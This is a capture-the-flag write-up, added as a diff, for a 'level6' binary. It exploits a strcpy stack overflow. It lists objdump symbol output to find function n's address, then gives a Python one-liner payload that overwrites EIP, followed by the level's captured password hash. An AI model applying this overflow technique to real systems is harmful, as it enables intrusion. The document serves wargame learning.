@@ -1,0 +1,41 @@
+The program expects a user input string which it copies into a fixed 64-byte buffer with a strcpy. No check of the input size is done -> buffer overflow.
+
+We will therefore be able to modify EIP, and call a function N in our program which gives us the level 7 pass
+
+objdump -t ./level6 | grep n
+08048134 l    d  .interp	00000000              .interp
+08048148 l    d  .note.ABI-tag	00000000              .note.ABI-tag
+08048168 l    d  .note.gnu.build-id	00000000              .note.gnu.build-id
+0804818c l    d  .gnu.hash	00000000              .gnu.hash
+080481ac l    d  .dynsym	00000000              .dynsym
+0804822c l    d  .dynstr	00000000              .dynstr
+0804828c l    d  .gnu.version	00000000              .gnu.version
+0804829c l    d  .gnu.version_r	00000000              .gnu.version_r
+080482bc l    d  .rel.dyn	00000000              .rel.dyn
+080482f4 l    d  .init	00000000              .init
+0804858c l    d  .fini	00000000              .fini
+08049734 l    d  .dynamic	00000000              .dynamic
+00000000 l    d  .comment	00000000              .comment
+08049720 l       .ctors	00000000              __init_array_end
+08049734 l     O .dynamic	00000000              _DYNAMIC
+08049720 l       .ctors	00000000              __init_array_start
+08048550 g     F .text	00000002              __libc_csu_fini
+08048552 g     F .text	00000000              .hidden __i686.get_pc_thunk.bx
+08048454 g     F .text	00000014              n
+0804858c g     F .fini	00000000              _fini
+0804972c g     O .dtors	00000000              .hidden __DTOR_END__
+00000000  w      *UND*	00000000              __gmon_start__
+08049828 g     O .data	00000000              .hidden __dso_handle
+080485ac g     O .rodata	00000004              _IO_stdin_used
+00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
+080484e0 g     F .text	00000061              __libc_csu_init
+08049834 g       *ABS*	00000000              _end
+0804847c g     F .text	00000058              main
+080482f4 g     F .init	00000000              _init
+
+08048454 -> Adress of n
+
+ 
+
+python -c 'print("A"*72 + "\x54\x84\x04\x08")' | xargs ./level6
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
